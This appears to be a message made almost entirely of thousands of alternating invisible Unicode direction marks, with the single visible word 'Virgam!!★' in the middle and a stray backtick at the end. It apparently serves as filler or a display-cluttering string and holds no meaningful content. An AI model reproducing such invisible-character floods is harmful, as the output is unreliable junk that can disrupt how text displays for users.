‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎Virgam!!★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏
`
